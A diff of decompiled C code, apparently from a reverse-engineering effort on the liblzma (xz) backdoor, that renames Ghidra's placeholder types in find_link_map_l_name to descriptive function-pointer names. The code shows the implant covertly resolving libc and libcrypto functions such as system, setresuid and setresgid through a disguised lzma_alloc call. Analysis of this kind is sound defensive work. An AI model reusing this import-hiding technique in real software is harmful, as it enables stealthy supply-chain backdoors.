@@ -23,20 +23,20 @@ BOOL find_link_map_l_name
   libc_imports_t *plVar1;
   elf_info_t *peVar2;
   link_map *plVar3;
-  _func_64 *code_start;
+  dl_audit_symbind_alt_fn code_start;
   BOOL BVar4;
   uint uVar5;
   lzma_allocator *allocator;
-  _func_19 *p_Var6;
-  _func_27 *p_Var7;
-  _func_20 *p_Var8;
+  pfn_exit_t ppVar6;
+  pfn_setlogmask_t ppVar7;
+  pfn_setresgid_t ppVar8;
   lzma_allocator *allocator_00;
   Elf64_Sym *pEVar9;
-  _func_39 *p_Var10;
+  pfn_BN_num_bits_t ppVar10;
   uchar *code_start_00;
-  _func_21 *p_Var11;
-  _func_22 *p_Var12;
-  _func_28 *p_Var13;
+  pfn_setresuid_t ppVar11;
+  pfn_system_t ppVar12;
+  pfn_shutdown_t ppVar13;
   link_map *plVar14;
   link_map *plVar15;
   u64 displacement;
@@ -46,7 +46,7 @@ BOOL find_link_map_l_name
   libc_imports_t *libc_imports;
   elf_info_t *ldso_elf;
   link_map *link_map_cursor;
-  _func_64 *audit_stub;
+  dl_audit_symbind_alt_fn audit_stub;
   lzma_allocator *import_allocator;
   u64 local_38;
   
@@ -56,19 +56,19 @@ BOOL find_link_map_l_name
     plVar18 = data_handle->data->liblzma_map;
     allocator = get_lzma_allocator();
     allocator->opaque = data_handle->elf_handles->libc;
-    p_Var6 = (_func_19 *)lzma_alloc(0x8a8,allocator);
-    plVar1->exit = p_Var6;
-    if (p_Var6 != (_func_19 *)0x0) {
+    ppVar6 = (pfn_exit_t)lzma_alloc(0x8a8,allocator);
+    plVar1->exit = ppVar6;
+    if (ppVar6 != (pfn_exit_t)0x0) {
       plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
     }
-    p_Var7 = (_func_27 *)lzma_alloc(0x428,allocator);
-    plVar1->setlogmask = p_Var7;
-    if (p_Var7 != (_func_27 *)0x0) {
+    ppVar7 = (pfn_setlogmask_t)lzma_alloc(0x428,allocator);
+    plVar1->setlogmask = ppVar7;
+    if (ppVar7 != (pfn_setlogmask_t)0x0) {
       plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
     }
-    p_Var8 = (_func_20 *)lzma_alloc(0x5f0,allocator);
-    plVar1->setresgid = p_Var8;
-    if (p_Var8 != (_func_20 *)0x0) {
+    ppVar8 = (pfn_setresgid_t)lzma_alloc(0x5f0,allocator);
+    plVar1->setresgid = ppVar8;
+    if (ppVar8 != (pfn_setresgid_t)0x0) {
       plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
     }
     allocator_00 = get_lzma_allocator();
@@ -76,9 +76,9 @@ BOOL find_link_map_l_name
     allocator_00->opaque = data_handle->elf_handles->libcrypto;
     pEVar9 = elf_symbol_get(peVar2,STR_dl_audit_preinit,0);
     if (pEVar9 != (Elf64_Sym *)0x0) {
-      p_Var10 = (_func_39 *)lzma_alloc(0x4e0,allocator_00);
-      imported_funcs->BN_num_bits = p_Var10;
-      if (p_Var10 != (_func_39 *)0x0) {
+      ppVar10 = (pfn_BN_num_bits_t)lzma_alloc(0x4e0,allocator_00);
+      imported_funcs->BN_num_bits = ppVar10;
+      if (ppVar10 != (pfn_BN_num_bits_t)0x0) {
         imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
       }
       peVar2 = data_handle->elf_handles->dynamic_linker;
@@ -109,9 +109,9 @@ LAB_001041f0:
           }
           if (plVar15 != (link_map *)0xffffffffffffffff) {
             allocator->opaque = data_handle->elf_handles->libc;
-            p_Var11 = (_func_21 *)lzma_alloc(0xab8,allocator);
-            plVar1->setresuid = p_Var11;
-            if (p_Var11 != (_func_21 *)0x0) {
+            ppVar11 = (pfn_setresuid_t)lzma_alloc(0xab8,allocator);
+            plVar1->setresuid = ppVar11;
+            if (ppVar11 != (pfn_setresuid_t)0x0) {
               plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
             }
             plVar18 = data_handle->data->liblzma_map;
@@ -136,14 +136,14 @@ LAB_001041f0:
               return FALSE;
             }
             allocator->opaque = data_handle->elf_handles->libc;
-            p_Var12 = (_func_22 *)lzma_alloc(0x9f8,allocator);
-            plVar1->system = p_Var12;
-            if (p_Var12 != (_func_22 *)0x0) {
+            ppVar12 = (pfn_system_t)lzma_alloc(0x9f8,allocator);
+            plVar1->system = ppVar12;
+            if (ppVar12 != (pfn_system_t)0x0) {
               plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
             }
-            p_Var13 = (_func_28 *)lzma_alloc(0x760,allocator);
-            plVar1->shutdown = p_Var13;
-            if (p_Var13 != (_func_28 *)0x0) {
+            ppVar13 = (pfn_shutdown_t)lzma_alloc(0x760,allocator);
+            plVar1->shutdown = ppVar13;
+            if (ppVar13 != (pfn_shutdown_t)0x0) {
               plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
             }
             allocator_00->opaque = data_handle->elf_handles->libcrypto;
